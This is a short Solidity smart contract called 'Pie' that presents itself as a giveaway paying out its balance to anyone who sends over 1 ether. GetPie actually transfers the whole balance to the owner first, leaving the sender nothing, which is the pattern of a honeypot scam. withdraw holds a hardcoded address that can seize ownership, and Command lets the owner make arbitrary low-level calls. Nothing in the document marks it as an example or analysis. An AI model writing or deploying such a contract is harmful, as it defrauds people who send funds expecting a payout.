pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function GetPie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            Owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 sig = bytes4(keccak256("function_name(arguments)"));
        assembly {
            let ptr := mload(0x40)
            let result := call(gas, adr, msg.value, add(data, 0x20), mload(data), ptr, 0x20)
            success := eq(result, 1)
        }
        require(success);
    }
}